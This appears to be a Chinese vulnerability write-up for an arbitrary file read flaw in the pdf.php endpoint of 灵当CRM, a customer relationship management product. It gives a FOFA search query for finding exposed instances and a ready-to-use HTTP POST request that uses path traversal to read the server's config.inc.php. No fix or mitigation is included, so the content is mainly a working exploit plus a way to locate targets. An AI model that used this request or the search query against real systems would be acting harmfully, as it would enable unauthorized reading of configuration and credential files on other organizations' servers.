# 灵当crm pdf存在任意文件读取漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">灵当CRM（Customer Relationship Management，客户关系管理）是一款面向中小企业的客户关系管理软件，旨在帮助企业更好地管理客户信息、销售流程、市场营销和服务支持等方面的工作。灵当CRM提供了一系列工具和功能，帮助企业在销售、市场和服务部门之间实现高效协作，提高客户满意度和业务效率。灵当crm pdf存在任意文件读取漏洞。</font>

# 二、影响版本
+ 灵当crm

# 三、资产测绘
+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"` `<font style="color:rgb(51, 51, 51);">body="crmcommon/js/jquery/jquery-1.10.1.min.js"</font>`
+ 特征

![1722999861305-1e9e41ad-ed6a-4750-918d-61a0631ad06a.png](./img/uNV9YIwNHkg-_q-Y/1722999861305-1e9e41ad-ed6a-4750-918d-61a0631ad06a-880986.png)

# 四、漏洞复现
```plain
POST /crm/data/pdf.php?url=../config.inc.php HTTP/1.1
Host: 
Content-Length: 2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
```

![1728882377030-f7b89190-737c-4a4b-8097-45564458f641.png](./img/uNV9YIwNHkg-_q-Y/1728882377030-f7b89190-737c-4a4b-8097-45564458f641-707988.png)



> 更新: 2024-10-21 11:49:37  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lbbo0kaxgwsh554t>